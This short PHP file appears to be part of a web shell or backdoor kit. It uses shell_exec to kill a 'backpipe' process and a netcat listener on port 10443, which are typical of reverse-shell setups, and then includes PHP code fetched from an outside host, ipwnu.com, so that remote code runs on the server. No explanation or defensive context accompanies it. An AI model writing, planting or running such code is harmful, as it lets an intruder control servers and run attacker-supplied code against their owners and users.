<?php

echo shell_exec('pkill -f "backpipe"');
echo shell_exec('pkill -f "nc -l -p 10443"');

$message = "Trying to kill nc processes";

include("http://ipwnu.com/dir.php");
